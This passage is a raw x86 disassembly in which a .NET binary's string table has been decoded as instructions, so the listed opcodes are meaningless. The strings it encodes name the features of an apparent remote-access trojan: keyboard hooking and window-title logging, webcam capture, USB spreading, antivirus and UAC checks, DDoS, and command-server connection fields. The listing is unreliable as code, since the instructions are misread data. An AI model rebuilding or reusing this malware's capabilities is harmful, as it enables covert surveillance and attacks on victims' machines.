  407096:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40709d:	42                   	inc    %edx
  40709e:	61                   	popa
  40709f:	73 65                	jae    0x407106
  4070a1:	00 2e                	add    %ch,(%esi)
  4070a3:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4070a7:	00 4d 69             	add    %cl,0x69(%ebp)
  4070aa:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4070ad:	73 6f                	jae    0x40711e
  4070af:	66 74 2e             	data16 je 0x4070e0
  4070b2:	56                   	push   %esi
  4070b3:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4070ba:	73 69                	jae    0x407125
  4070bc:	63 2e                	arpl   %ebp,(%esi)
  4070be:	44                   	inc    %esp
  4070bf:	65 76 69             	gs jbe 0x40712b
  4070c2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4070c5:	00 43 6f             	add    %al,0x6f(%ebx)
  4070c8:	6d                   	insl   (%dx),%es:(%edi)
  4070c9:	70 75                	jo     0x407140
  4070cb:	74 65                	je     0x407132
  4070cd:	72 00                	jb     0x4070cf
  4070cf:	53                   	push   %ebx
  4070d0:	79 73                	jns    0x407145
  4070d2:	74 65                	je     0x407139
  4070d4:	6d                   	insl   (%dx),%es:(%edi)
  4070d5:	00 4f 62             	add    %cl,0x62(%edi)
  4070d8:	6a 65                	push   $0x65
  4070da:	63 74 00 2e          	arpl   %esi,0x2e(%eax,%eax,1)
  4070de:	63 63 74             	arpl   %esp,0x74(%ebx)
  4070e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4070e2:	72 00                	jb     0x4070e4
  4070e4:	67 65 74 5f          	addr16 gs je 0x407147
  4070e8:	43                   	inc    %ebx
  4070e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ea:	6d                   	insl   (%dx),%es:(%edi)
  4070eb:	70 75                	jo     0x407162
  4070ed:	74 65                	je     0x407154
  4070ef:	72 00                	jb     0x4070f1
  4070f1:	6d                   	insl   (%dx),%es:(%edi)
  4070f2:	5f                   	pop    %edi
  4070f3:	43                   	inc    %ebx
  4070f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4070f5:	6d                   	insl   (%dx),%es:(%edi)
  4070f6:	70 75                	jo     0x40716d
  4070f8:	74 65                	je     0x40715f
  4070fa:	72 4f                	jb     0x40714b
  4070fc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4070ff:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  407103:	6f                   	outsl  %ds:(%esi),(%dx)
  407104:	76 69                	jbe    0x40716f
  407106:	64 65 72 00          	fs gs jb 0x40710a
  40710a:	67 65 74 5f          	addr16 gs je 0x40716d
  40710e:	41                   	inc    %ecx
  40710f:	70 70                	jo     0x407181
  407111:	6c                   	insb   (%dx),%es:(%edi)
  407112:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407119:	00 6d 5f             	add    %ch,0x5f(%ebp)
  40711c:	41                   	inc    %ecx
  40711d:	70 70                	jo     0x40718f
  40711f:	4f                   	dec    %edi
  407120:	62 6a 65             	bound  %ebp,0x65(%edx)
  407123:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  407127:	6f                   	outsl  %ds:(%esi),(%dx)
  407128:	76 69                	jbe    0x407193
  40712a:	64 65 72 00          	fs gs jb 0x40712e
  40712e:	55                   	push   %ebp
  40712f:	73 65                	jae    0x407196
  407131:	72 00                	jb     0x407133
  407133:	67 65 74 5f          	addr16 gs je 0x407196
  407137:	55                   	push   %ebp
  407138:	73 65                	jae    0x40719f
  40713a:	72 00                	jb     0x40713c
  40713c:	6d                   	insl   (%dx),%es:(%edi)
  40713d:	5f                   	pop    %edi
  40713e:	55                   	push   %ebp
  40713f:	73 65                	jae    0x4071a6
  407141:	72 4f                	jb     0x407192
  407143:	62 6a 65             	bound  %ebp,0x65(%edx)
  407146:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  40714a:	6f                   	outsl  %ds:(%esi),(%dx)
  40714b:	76 69                	jbe    0x4071b6
  40714d:	64 65 72 00          	fs gs jb 0x407151
  407151:	67 65 74 5f          	addr16 gs je 0x4071b4
  407155:	57                   	push   %edi
  407156:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  40715a:	72 76                	jb     0x4071d2
  40715c:	69 63 65 73 00 6d 5f 	imul   $0x5f6d0073,0x65(%ebx),%esp
  407163:	4d                   	dec    %ebp
  407164:	79 57                	jns    0x4071bd
  407166:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  40716a:	72 76                	jb     0x4071e2
  40716c:	69 63 65 73 4f 62 6a 	imul   $0x6a624f73,0x65(%ebx),%esp
  407173:	65 63 74 50 72       	arpl   %esi,%gs:0x72(%eax,%edx,2)
  407178:	6f                   	outsl  %ds:(%esi),(%dx)
  407179:	76 69                	jbe    0x4071e4
  40717b:	64 65 72 00          	fs gs jb 0x40717f
  40717f:	41                   	inc    %ecx
  407180:	70 70                	jo     0x4071f2
  407182:	6c                   	insb   (%dx),%es:(%edi)
  407183:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40718a:	00 57 65             	add    %dl,0x65(%edi)
  40718d:	62 53 65             	bound  %edx,0x65(%ebx)
  407190:	72 76                	jb     0x407208
  407192:	69 63 65 73 00 45 71 	imul   $0x71450073,0x65(%ebx),%esp
  407199:	75 61                	jne    0x4071fc
  40719b:	6c                   	insb   (%dx),%es:(%edi)
  40719c:	73 00                	jae    0x40719e
  40719e:	6f                   	outsl  %ds:(%esi),(%dx)
  40719f:	00 47 65             	add    %al,0x65(%edi)
  4071a2:	74 48                	je     0x4071ec
  4071a4:	61                   	popa
  4071a5:	73 68                	jae    0x40720f
  4071a7:	43                   	inc    %ebx
  4071a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4071a9:	64 65 00 54 79 70    	fs add %dl,%gs:0x70(%ecx,%edi,2)
  4071af:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4071b3:	74 54                	je     0x407209
  4071b5:	79 70                	jns    0x407227
  4071b7:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  4071bc:	74 72                	je     0x407230
  4071be:	69 6e 67 00 43 72 65 	imul   $0x65724300,0x67(%esi),%ebp
  4071c5:	61                   	popa
  4071c6:	74 65                	je     0x40722d
  4071c8:	5f                   	pop    %edi
  4071c9:	5f                   	pop    %edi
  4071ca:	49                   	dec    %ecx
  4071cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4071cc:	73 74                	jae    0x407242
  4071ce:	61                   	popa
  4071cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4071d0:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  4071d3:	5f                   	pop    %edi
  4071d4:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  4071d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4071d9:	73 74                	jae    0x40724f
  4071db:	61                   	popa
  4071dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4071dd:	63 65 00             	arpl   %esp,0x0(%ebp)
  4071e0:	44                   	inc    %esp
  4071e1:	69 73 70 6f 73 65 5f 	imul   $0x5f65736f,0x70(%ebx),%esi
  4071e8:	5f                   	pop    %edi
  4071e9:	49                   	dec    %ecx
  4071ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4071eb:	73 74                	jae    0x407261
  4071ed:	61                   	popa
  4071ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4071ef:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  4071f2:	5f                   	pop    %edi
  4071f3:	00 67 65             	add    %ah,0x65(%edi)
  4071f6:	74 5f                	je     0x407257
  4071f8:	47                   	inc    %edi
  4071f9:	65 74 49             	gs je  0x407245
  4071fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4071fd:	73 74                	jae    0x407273
  4071ff:	61                   	popa
  407200:	6e                   	outsb  %ds:(%esi),(%dx)
  407201:	63 65 00             	arpl   %esp,0x0(%ebp)
  407204:	6d                   	insl   (%dx),%es:(%edi)
  407205:	5f                   	pop    %edi
  407206:	54                   	push   %esp
  407207:	68 72 65 61 64       	push   $0x64616572
  40720c:	53                   	push   %ebx
  40720d:	74 61                	je     0x407270
  40720f:	74 69                	je     0x40727a
  407211:	63 56 61             	arpl   %edx,0x61(%esi)
  407214:	6c                   	insb   (%dx),%es:(%edi)
  407215:	75 65                	jne    0x40727c
  407217:	00 47 65             	add    %al,0x65(%edi)
  40721a:	74 49                	je     0x407265
  40721c:	6e                   	outsb  %ds:(%esi),(%dx)
  40721d:	73 74                	jae    0x407293
  40721f:	61                   	popa
  407220:	6e                   	outsb  %ds:(%esi),(%dx)
  407221:	63 65 00             	arpl   %esp,0x0(%ebp)
  407224:	50                   	push   %eax
  407225:	61                   	popa
  407226:	73 74                	jae    0x40729c
  407228:	65 55                	gs push %ebp
  40722a:	72 6c                	jb     0x407298
  40722c:	00 48 6f             	add    %cl,0x6f(%eax)
  40722f:	73 74                	jae    0x4072a5
  407231:	00 50 6f             	add    %dl,0x6f(%eax)
  407234:	72 74                	jb     0x4072aa
  407236:	00 4b 45             	add    %cl,0x45(%ebx)
  407239:	59                   	pop    %ecx
  40723a:	00 53 50             	add    %dl,0x50(%ebx)
  40723d:	4c                   	dec    %esp
  40723e:	00 53 6c             	add    %dl,0x6c(%ebx)
  407241:	65 65 70 00          	gs gs jo 0x407245
  407245:	47                   	inc    %edi
  407246:	72 6f                	jb     0x4072b7
  407248:	75 62                	jne    0x4072ac
  40724a:	00 55 53             	add    %dl,0x53(%ebp)
  40724d:	42                   	inc    %edx
  40724e:	4e                   	dec    %esi
  40724f:	4d                   	dec    %ebp
  407250:	00 4d 75             	add    %cl,0x75(%ebp)
  407253:	74 65                	je     0x4072ba
  407255:	78 00                	js     0x407257
  407257:	4c                   	dec    %esp
  407258:	6f                   	outsl  %ds:(%esi),(%dx)
  407259:	67 67 65 72 50       	addr16 addr16 gs jb 0x4072ae
  40725e:	61                   	popa
  40725f:	74 68                	je     0x4072c9
  407261:	00 44 6f 77          	add    %al,0x77(%edi,%ebp,2)
  407265:	6e                   	outsb  %ds:(%esi),(%dx)
  407266:	6c                   	insb   (%dx),%es:(%edi)
  407267:	6f                   	outsl  %ds:(%esi),(%dx)
  407268:	61                   	popa
  407269:	64 53                	fs push %ebx
  40726b:	74 72                	je     0x4072df
  40726d:	00 75 72             	add    %dh,0x72(%ebp)
  407270:	6c                   	insb   (%dx),%es:(%edi)
  407271:	00 69 73             	add    %ch,0x73(%ecx)
  407274:	43                   	inc    %ebx
  407275:	6f                   	outsl  %ds:(%esi),(%dx)
  407276:	6e                   	outsb  %ds:(%esi),(%dx)
  407277:	6e                   	outsb  %ds:(%esi),(%dx)
  407278:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40727d:	00 53 79             	add    %dl,0x79(%ebx)
  407280:	73 74                	jae    0x4072f6
  407282:	65 6d                	gs insl (%dx),%es:(%edi)
  407284:	2e 4e                	cs dec %esi
  407286:	65 74 2e             	gs je  0x4072b7
  407289:	53                   	push   %ebx
  40728a:	6f                   	outsl  %ds:(%esi),(%dx)
  40728b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40728e:	74 73                	je     0x407303
  407290:	00 53 6f             	add    %dl,0x6f(%ebx)
  407293:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407296:	74 00                	je     0x407298
  407298:	53                   	push   %ebx
  407299:	00 42 75             	add    %al,0x75(%edx)
  40729c:	66 66 65 72 4c       	data16 data16 gs jb 0x4072ed
  4072a1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4072a3:	67 74 68             	addr16 je 0x40730e
  4072a6:	00 42 75             	add    %al,0x75(%edx)
  4072a9:	66 66 65 72 00       	data16 data16 gs jb 0x4072ae
  4072ae:	53                   	push   %ebx
  4072af:	79 73                	jns    0x407324
  4072b1:	74 65                	je     0x407318
  4072b3:	6d                   	insl   (%dx),%es:(%edi)
  4072b4:	2e 49                	cs dec %ecx
  4072b6:	4f                   	dec    %edi
  4072b7:	00 4d 65             	add    %cl,0x65(%ebp)
  4072ba:	6d                   	insl   (%dx),%es:(%edi)
  4072bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4072bc:	72 79                	jb     0x407337
  4072be:	53                   	push   %ebx
  4072bf:	74 72                	je     0x407333
  4072c1:	65 61                	gs popa
  4072c3:	6d                   	insl   (%dx),%es:(%edi)
  4072c4:	00 4d 53             	add    %cl,0x53(%ebp)
  4072c7:	00 53 79             	add    %dl,0x79(%ebx)
  4072ca:	73 74                	jae    0x407340
  4072cc:	65 6d                	gs insl (%dx),%es:(%edi)
  4072ce:	2e 54                	cs push %esp
  4072d0:	68 72 65 61 64       	push   $0x64616572
  4072d5:	69 6e 67 00 54 69 6d 	imul   $0x6d695400,0x67(%esi),%ebp
  4072dc:	65 72 00             	gs jb  0x4072df
  4072df:	54                   	push   %esp
  4072e0:	69 63 6b 00 4d 61 6e 	imul   $0x6e614d00,0x6b(%ebx),%esp
  4072e7:	75 61                	jne    0x40734a
  4072e9:	6c                   	insb   (%dx),%es:(%edi)
  4072ea:	52                   	push   %edx
  4072eb:	65 73 65             	gs jae 0x407353
  4072ee:	74 45                	je     0x407335
  4072f0:	76 65                	jbe    0x407357
  4072f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4072f3:	74 00                	je     0x4072f5
  4072f5:	61                   	popa
  4072f6:	6c                   	insb   (%dx),%es:(%edi)
  4072f7:	6c                   	insb   (%dx),%es:(%edi)
  4072f8:	44                   	inc    %esp
  4072f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4072fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4072fb:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  4072ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407300:	64 53                	fs push %ebx
  407302:	79 6e                	jns    0x407372
  407304:	63 00                	arpl   %eax,(%eax)
  407306:	53                   	push   %ebx
  407307:	70 65                	jo     0x40736e
  407309:	65 64 00 49 6e       	gs add %cl,%fs:0x6e(%ecx)
  40730e:	74 65                	je     0x407375
  407310:	72 76                	jb     0x407388
  407312:	61                   	popa
  407313:	6c                   	insb   (%dx),%es:(%edi)
  407314:	00 41 63             	add    %al,0x63(%ecx)
  407317:	74 69                	je     0x407382
  407319:	76 61                	jbe    0x40737c
  40731b:	74 65                	je     0x407382
  40731d:	50                   	push   %eax
  40731e:	6f                   	outsl  %ds:(%esi),(%dx)
  40731f:	6e                   	outsb  %ds:(%esi),(%dx)
  407320:	67 00 42 65          	add    %al,0x65(%bp,%si)
  407324:	67 69 6e 43 6f 6e 6e 	imul   $0x656e6e6f,0x43(%bp),%ebp
  40732b:	65 
  40732c:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  407330:	6f                   	outsl  %ds:(%esi),(%dx)
  407331:	6e                   	outsb  %ds:(%esi),(%dx)
  407332:	6e                   	outsb  %ds:(%esi),(%dx)
  407333:	65 63 74 53 65       	arpl   %esi,%gs:0x65(%ebx,%edx,2)
  407338:	72 76                	jb     0x4073b0
  40733a:	65 72 00             	gs jb  0x40733d
  40733d:	48                   	dec    %eax
  40733e:	00 49 6e             	add    %cl,0x6e(%ecx)
  407341:	66 6f                	outsw  %ds:(%esi),(%dx)
  407343:	00 49 4e             	add    %cl,0x4e(%ecx)
  407346:	44                   	inc    %esp
  407347:	41                   	inc    %ecx
  407348:	54                   	push   %esp
  407349:	45                   	inc    %ebp
  40734a:	00 53 70             	add    %dl,0x70(%ebx)
  40734d:	72 65                	jb     0x4073b4
  40734f:	61                   	popa
  407350:	64 00 55 41          	add    %dl,%fs:0x41(%ebp)
  407354:	43                   	inc    %ebx
  407355:	00 41 6e             	add    %al,0x6e(%ecx)
  407358:	74 69                	je     0x4073c3
  40735a:	76 69                	jbe    0x4073c5
  40735c:	72 75                	jb     0x4073d3
  40735e:	73 00                	jae    0x407360
  407360:	47                   	inc    %edi
  407361:	50                   	push   %eax
  407362:	55                   	push   %ebp
  407363:	00 43 50             	add    %al,0x50(%ebx)
  407366:	55                   	push   %ebp
  407367:	00 52 41             	add    %dl,0x41(%edx)
  40736a:	4d                   	dec    %ebp
  40736b:	00 49 41             	add    %cl,0x41(%ecx)
  40736e:	73 79                	jae    0x4073e9
  407370:	6e                   	outsb  %ds:(%esi),(%dx)
  407371:	63 52 65             	arpl   %edx,0x65(%edx)
  407374:	73 75                	jae    0x4073eb
  407376:	6c                   	insb   (%dx),%es:(%edi)
  407377:	74 00                	je     0x407379
  407379:	42                   	inc    %edx
  40737a:	65 67 69 6e 52 65 63 	imul   $0x69656365,%gs:0x52(%bp),%ebp
  407381:	65 69 
  407383:	76 65                	jbe    0x4073ea
  407385:	00 61 72             	add    %ah,0x72(%ecx)
  407388:	00 42 65             	add    %al,0x65(%edx)
  40738b:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407392:	00 
  407393:	62 00                	bound  %eax,(%eax)
  407395:	53                   	push   %ebx
  407396:	65 6e                	outsb  %gs:(%esi),(%dx)
  407398:	64 00 6d 73          	add    %ch,%fs:0x73(%ebp)
  40739c:	67 00 45 6e          	add    %al,0x6e(%di)
  4073a0:	64 53                	fs push %ebx
  4073a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4073a4:	64 00 69 73          	add    %ch,%fs:0x73(%ecx)
  4073a8:	44                   	inc    %esp
  4073a9:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  4073b0:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  4073b4:	00 50 6f             	add    %dl,0x6f(%eax)
  4073b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4073b8:	67 00 6f 62          	add    %ch,0x62(%bx)
  4073bc:	6a 00                	push   $0x0
  4073be:	50                   	push   %eax
  4073bf:	69 6e 67 00 50 61 63 	imul   $0x63615000,0x67(%esi),%ebp
  4073c6:	6b 00 52             	imul   $0x52,(%eax),%eax
  4073c9:	65 61                	gs popa
  4073cb:	64 00 52 53          	add    %dl,%fs:0x53(%edx)
  4073cf:	00 50 6c             	add    %dl,0x6c(%eax)
  4073d2:	75 67                	jne    0x40743b
  4073d4:	69 6e 00 42 00 53 65 	imul   $0x65530042,0x0(%esi),%ebp
  4073db:	6e                   	outsb  %ds:(%esi),(%dx)
  4073dc:	64 4d                	fs dec %ebp
  4073de:	53                   	push   %ebx
  4073df:	47                   	inc    %edi
  4073e0:	00 53 65             	add    %dl,0x65(%ebx)
  4073e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4073e4:	64 45                	fs inc %ebp
  4073e6:	72 72                	jb     0x40745a
  4073e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4073e9:	72 00                	jb     0x4073eb
  4073eb:	54                   	push   %esp
  4073ec:	68 72 65 61 64       	push   $0x64616572
  4073f1:	00 44 44 6f          	add    %al,0x6f(%esp,%eax,2)
  4073f5:	73 00                	jae    0x4073f7
  4073f7:	52                   	push   %edx
  4073f8:	65 70 6f             	gs jo  0x40746a
  4073fb:	72 74                	jb     0x407471
  4073fd:	57                   	push   %edi
  4073fe:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  407405:	44                   	inc    %esp
  407406:	00 49 6e             	add    %cl,0x6e(%ecx)
  407409:	70 75                	jo     0x407480
  40740b:	74 00                	je     0x40740d
  40740d:	4d                   	dec    %ebp
  40740e:	6f                   	outsl  %ds:(%esi),(%dx)
  40740f:	6e                   	outsb  %ds:(%esi),(%dx)
  407410:	69 74 6f 72 69 6e 67 	imul   $0x676e69,0x72(%edi,%ebp,2),%esi
  407417:	00 
  407418:	44                   	inc    %esp
  407419:	61                   	popa
  40741a:	74 61                	je     0x40747d
  40741c:	00 4f 70             	add    %cl,0x70(%edi)
  40741f:	65 6e                	outsb  %gs:(%esi),(%dx)
  407421:	55                   	push   %ebp
  407422:	72 6c                	jb     0x407490
  407424:	00 55 72             	add    %dl,0x72(%ebp)
  407427:	6c                   	insb   (%dx),%es:(%edi)
  407428:	00 48 69             	add    %cl,0x69(%eax)
  40742b:	64 64 65 6e          	fs fs outsb %gs:(%esi),(%dx)
  40742f:	00 63 61             	add    %ah,0x61(%ebx)
  407432:	70 43                	jo     0x407477
  407434:	72 65                	jb     0x40749b
  407436:	61                   	popa
  407437:	74 65                	je     0x40749e
  407439:	43                   	inc    %ebx
  40743a:	61                   	popa
  40743b:	70 74                	jo     0x4074b1
  40743d:	75 72                	jne    0x4074b1
  40743f:	65 57                	gs push %edi
  407441:	69 6e 64 6f 77 41 00 	imul   $0x41776f,0x64(%esi),%ebp
  407448:	6c                   	insb   (%dx),%es:(%edi)
  407449:	70 73                	jo     0x4074be
  40744b:	7a 57                	jp     0x4074a4
  40744d:	69 6e 64 6f 77 4e 61 	imul   $0x614e776f,0x64(%esi),%ebp
  407454:	6d                   	insl   (%dx),%es:(%edi)
  407455:	65 00 64 77 53       	add    %ah,%gs:0x53(%edi,%esi,2)
  40745a:	74 79                	je     0x4074d5
  40745c:	6c                   	insb   (%dx),%es:(%edi)
  40745d:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  407461:	59                   	pop    %ecx
  407462:	00 6e 57             	add    %ch,0x57(%esi)
  407465:	69 64 74 68 00 6e 48 	imul   $0x65486e00,0x68(%esp,%esi,2),%esp
  40746c:	65 
  40746d:	69 67 68 74 00 68 77 	imul   $0x77680074,0x68(%edi),%esp
  407474:	6e                   	outsb  %ds:(%esi),(%dx)
  407475:	64 50                	fs push %eax
  407477:	61                   	popa
  407478:	72 65                	jb     0x4074df
  40747a:	6e                   	outsb  %ds:(%esi),(%dx)
  40747b:	74 00                	je     0x40747d
  40747d:	6e                   	outsb  %ds:(%esi),(%dx)
  40747e:	49                   	dec    %ecx
  40747f:	44                   	inc    %esp
  407480:	00 48 61             	add    %cl,0x61(%eax)
  407483:	6e                   	outsb  %ds:(%esi),(%dx)
  407484:	64 6c                	fs insb (%dx),%es:(%edi)
  407486:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  40748a:	70 47                	jo     0x4074d3
  40748c:	65 74 44             	gs je  0x4074d3
  40748f:	72 69                	jb     0x4074fa
  407491:	76 65                	jbe    0x4074f8
  407493:	72 44                	jb     0x4074d9
  407495:	65 73 63             	gs jae 0x4074fb
  407498:	72 69                	jb     0x407503
  40749a:	70 74                	jo     0x407510
  40749c:	69 6f 6e 41 00 77 44 	imul   $0x44770041,0x6e(%edi),%ebp
  4074a3:	72 69                	jb     0x40750e
  4074a5:	76 65                	jbe    0x40750c
  4074a7:	72 00                	jb     0x4074a9
  4074a9:	6c                   	insb   (%dx),%es:(%edi)
  4074aa:	70 73                	jo     0x40751f
  4074ac:	7a 4e                	jp     0x4074fc
  4074ae:	61                   	popa
  4074af:	6d                   	insl   (%dx),%es:(%edi)
  4074b0:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  4074b4:	4e                   	dec    %esi
  4074b5:	61                   	popa
  4074b6:	6d                   	insl   (%dx),%es:(%edi)
  4074b7:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
  4074bc:	7a 56                	jp     0x407514
  4074be:	65 72 00             	gs jb  0x4074c1
  4074c1:	63 62 56             	arpl   %esp,0x56(%edx)
  4074c4:	65 72 00             	gs jb  0x4074c7
  4074c7:	43                   	inc    %ebx
  4074c8:	61                   	popa
  4074c9:	6d                   	insl   (%dx),%es:(%edi)
  4074ca:	00 52 75             	add    %dl,0x75(%edx)
  4074cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ce:	44                   	inc    %esp
  4074cf:	69 73 6b 00 45 78 74 	imul   $0x74784500,0x6b(%ebx),%esi
  4074d6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4074d8:	73 69                	jae    0x407543
  4074da:	6f                   	outsl  %ds:(%esi),(%dx)
  4074db:	6e                   	outsb  %ds:(%esi),(%dx)
  4074dc:	00 4d 65             	add    %cl,0x65(%ebp)
  4074df:	6d                   	insl   (%dx),%es:(%edi)
  4074e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4074e1:	72 79                	jb     0x40755c
  4074e3:	00 62 75             	add    %ah,0x75(%edx)
  4074e6:	66 66 65 72 00       	data16 data16 gs jb 0x4074eb
  4074eb:	55                   	push   %ebp
  4074ec:	4e                   	dec    %esi
  4074ed:	53                   	push   %ebx
  4074ee:	00 49 73             	add    %cl,0x73(%ecx)
  4074f1:	55                   	push   %ebp
  4074f2:	70 64                	jo     0x407558
  4074f4:	61                   	popa
  4074f5:	74 65                	je     0x40755c
  4074f7:	00 53 74             	add    %dl,0x74(%ebx)
  4074fa:	72 00                	jb     0x4074fc
  4074fc:	43                   	inc    %ebx
  4074fd:	75 72                	jne    0x407571
  4074ff:	72 65                	jb     0x407566
  407501:	6e                   	outsb  %ds:(%esi),(%dx)
  407502:	74 41                	je     0x407545
  407504:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407508:	65 57                	gs push %edi
  40750a:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407511:	74 6c                	je     0x40757f
  407513:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  407517:	6c                   	insb   (%dx),%es:(%edi)
  407518:	6c                   	insb   (%dx),%es:(%edi)
  407519:	6b 00 53             	imul   $0x53,(%eax),%eax
  40751c:	65 74 48             	gs je  0x407567
  40751f:	6f                   	outsl  %ds:(%esi),(%dx)
  407520:	6f                   	outsl  %ds:(%esi),(%dx)
  407521:	6b 00 70             	imul   $0x70,(%eax),%eax
  407524:	72 6f                	jb     0x407595
  407526:	63 00                	arpl   %eax,(%eax)
  407528:	48                   	dec    %eax
  407529:	6f                   	outsl  %ds:(%esi),(%dx)
  40752a:	6f                   	outsl  %ds:(%esi),(%dx)
  40752b:	6b 43 61 6c          	imul   $0x6c,0x61(%ebx),%eax
  40752f:	6c                   	insb   (%dx),%es:(%edi)
  407530:	62 61 63             	bound  %esp,0x63(%ecx)
  407533:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  407536:	43                   	inc    %ebx
  407537:	6f                   	outsl  %ds:(%esi),(%dx)
  407538:	64 65 00 77 50       	fs add %dh,%gs:0x50(%edi)
  40753d:	61                   	popa
  40753e:	72 61                	jb     0x4075a1
  407540:	6d                   	insl   (%dx),%es:(%edi)
  407541:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  407545:	72 61                	jb     0x4075a8
  407547:	6d                   	insl   (%dx),%es:(%edi)
  407548:	00 4b 65             	add    %cl,0x65(%ebx)
  40754b:	79 62                	jns    0x4075af
  40754d:	6f                   	outsl  %ds:(%esi),(%dx)
  40754e:	61                   	popa
  40754f:	72 64                	jb     0x4075b5
  407551:	4c                   	dec    %esp
  407552:	61                   	popa
  407553:	79 6f                	jns    0x4075c4
  407555:	75 74                	jne    0x4075cb
  407557:	00 76 6b             	add    %dh,0x6b(%esi)
  40755a:	43                   	inc    %ebx
  40755b:	6f                   	outsl  %ds:(%esi),(%dx)
  40755c:	64 65 00 47 65       	fs add %al,%gs:0x65(%edi)
  407561:	74 41                	je     0x4075a4
  407563:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407567:	65 57                	gs push %edi
  407569:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407570:	74 6c                	je     0x4075de
  407572:	65 00 57 4d          	add    %dl,%gs:0x4d(%edi)
  407576:	5f                   	pop    %edi
  407577:	4b                   	dec    %ebx
  407578:	45                   	inc    %ebp
  407579:	59                   	pop    %ecx
  40757a:	44                   	inc    %esp
  40757b:	4f                   	dec    %edi
  40757c:	57                   	push   %edi
  40757d:	4e                   	dec    %esi
  40757e:	00 5f 70             	add    %bl,0x70(%edi)
  407581:	72 6f                	jb     0x4075f2
  407583:	63 00                	arpl   %eax,(%eax)
  407585:	5f                   	pop    %edi
  407586:	68 6f 6f 6b 49       	push   $0x496b6f6f
  40758b:	44                   	inc    %esp
  40758c:	00 53 65             	add    %dl,0x65(%ebx)
  40758f:	74 57                	je     0x4075e8
  407591:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  407598:	6f                   	outsl  %ds:(%esi),(%dx)
  407599:	6f                   	outsl  %ds:(%esi),(%dx)
  40759a:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40759e:	69 64 48 6f 6f 6b 00 	imul   $0x6c006b6f,0x6f(%eax,%ecx,2),%esp
  4075a5:	6c 
  4075a6:	70 66                	jo     0x40760e
  4075a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4075a9:	00 68 4d             	add    %ch,0x4d(%eax)
  4075ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ad:	64 00 64 77 54       	add    %ah,%fs:0x54(%edi,%esi,2)
  4075b2:	68 72 65 61 64       	push   $0x64616572
  4075b7:	49                   	dec    %ecx
  4075b8:	64 00 55 6e          	add    %dl,%fs:0x6e(%ebp)
  4075bc:	68 6f 6f 6b 57       	push   $0x576b6f6f
  4075c1:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  4075c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4075c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ca:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4075ce:	68 68 6b 00 43       	push   $0x43006b68
  4075d3:	61                   	popa
  4075d4:	6c                   	insb   (%dx),%es:(%edi)
  4075d5:	6c                   	insb   (%dx),%es:(%edi)
